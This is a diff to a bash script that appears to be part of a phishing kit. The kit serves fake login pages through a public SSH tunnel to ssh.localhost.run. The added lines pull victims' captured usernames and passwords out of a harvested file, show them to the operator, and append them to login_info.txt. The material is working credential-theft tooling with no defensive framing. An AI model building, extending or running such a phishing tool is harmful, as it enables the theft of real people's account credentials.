@@ -343,7 +343,7 @@ printf "\n"
 if [[ -e linksender ]]; then
 rm -rf linksender
 fi
-printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to view Login Info.\e[0m\n"
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to view Login Info.Press it After Some Time\e[0m\n"
 printf "\e[1;93m\n"
 ssh -R 80:localhost:$port ssh.localhost.run 2>&1
 printf "\e[0m\n"
@@ -358,7 +358,15 @@ rm -rf websites/$server/ip.txt
 fi
 sleep 0.75
 if [[ -e "websites/$server/usernames.txt" ]]; then
-c_cred
+account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+cat websites/$server/usernames.txt >> websites/$server/login_info.txt
+printf "\e[0m\n"
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
+printf "\n"
 rm -rf websites/$server/usernames.txt
 fi
 sleep 0.75
